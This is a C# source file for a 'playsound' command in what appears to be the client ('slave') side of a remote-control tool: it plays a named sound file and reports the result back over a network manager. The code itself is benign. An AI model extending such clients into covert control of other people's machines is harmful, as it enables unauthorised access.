using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Media;
using Slave.Core;

namespace Slave.Commands
{
    internal class PlaySound : ICommand
    {
        public string name { get; } = "playsound";

        public void Process(List<string> args)
        {
            var filename = args[0];

            if (!File.Exists(filename))
            {
                SlaveNetworkManager.GetInstance().WriteLine("FileError");
                return;
            }

            try
            {
                var player = new SoundPlayer(filename);
                player.Play();
                SlaveNetworkManager.GetInstance().WriteLine("OK");
            }
            catch (InvalidOperationException)
            {
                SlaveNetworkManager.GetInstance().WriteLine("InvalidFormat");
            }
        }
    }
}
